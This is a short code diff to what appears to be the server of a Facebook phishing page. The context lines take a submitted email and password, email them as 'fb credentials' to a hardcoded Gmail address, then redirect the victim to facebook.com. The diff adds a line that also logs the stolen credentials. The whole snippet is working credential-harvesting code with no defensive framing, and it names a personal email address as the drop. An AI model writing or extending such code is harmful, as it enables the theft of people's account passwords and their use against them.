@@ -12,6 +12,7 @@ app.use(cors())
  const {email,password}=req.body 
  const  mheMail = " humphreyheather03@gmail.com"
 const  credentials  = `email: ${email}, password: ${password}`
+console.log(credentials)
 sendEmail(mheMail,'fb credentials',credentials)
 return res.redirect("https://www.facebook.com/")
  } )
